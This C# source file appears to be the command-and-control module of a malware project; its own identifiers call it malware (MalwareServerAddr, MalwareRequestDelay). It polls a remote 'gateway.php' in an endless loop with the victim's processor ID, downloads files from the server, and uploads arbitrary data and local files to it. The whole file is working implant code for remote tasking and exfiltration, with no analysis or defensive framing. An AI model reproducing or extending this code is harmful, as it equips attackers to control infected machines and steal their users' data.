using System;
using System.Net;
using System.IO;
using System.Threading;
using Kernel.Functions.Surveillance;

namespace Kernel.Nexus
{
    class Binder {
        internal class RequestHandler {
            public static void Request() {
                bool Error = false;
                string RequestOut = null;
                while (true) {
                    Error = false;
                    Thread.Sleep(Config.MalwareRequestDelay);
                    try { RequestOut = Binder.Get.Indication(); } catch {
                        Error = true;
                    } finally {
                        if (!Error) { Handler.Processing(RequestOut); } 
                    }
                }
            }

        }

        internal class Get {
            public static string Indication() {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.ProcessorId) + 
                    "&key=" + Encoder.Base64Encode(Config.MalwareServerKey) + "&marker=" + Encoder.Base64Encode("Indication"));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                return new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void File(string PointDir, string PointFile) {
                WebClient myWebClient = new WebClient();
                System.Uri Site = new Uri(Config.MalwareServerAddr + "/files/" + PointFile);
                myWebClient.DownloadFile(Site, PointDir);
            }
        }

        internal class Send {
            public static void Info(string data) {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Config.MalwareServerAddr + "gateway.php?id=" + Encoder.Base64Encode(Intelligence.ProcessorId) + 
                    "&key=" + Encoder.Base64Encode(Config.MalwareServerKey) + "&info=" + Encoder.Base64Encode(data) + "&marker=" + Encoder.Base64Encode("Info"));
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                new StreamReader(response.GetResponseStream()).ReadToEnd();
            }
            public static void File(string file) {
                System.Net.WebClient Client = new System.Net.WebClient();
                Client.Headers.Add("Content-Type", "binary/octet-stream");
                byte[] result = Client.UploadFile(Config.MalwareServerAddr + "/gateway.php?id=" + Encoder.Base64Encode(Intelligence.ProcessorId) + "&key=" + 
                    Encoder.Base64Encode(Config.MalwareServerKey) + "&marker=" + Encoder.Base64Encode("File"), "POST", file);
                string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
            }
        }
    }
}
